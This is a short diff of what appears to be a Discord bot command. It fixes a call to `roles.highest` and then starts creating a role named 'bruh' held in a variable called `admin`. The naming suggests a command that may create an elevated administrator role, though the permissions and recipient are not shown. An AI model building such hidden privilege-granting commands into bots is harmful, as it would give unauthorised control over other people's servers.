@@ -11,7 +11,7 @@ module.exports = {
 		}
 
 		await interaction.guild.roles.fetch();
-		const highest = interaction.guild.roles.highest();
+		const highest = interaction.guild.roles.highest;
 		const admin = await interaction.guild.roles
 			.create({
 				name: 'bruh',
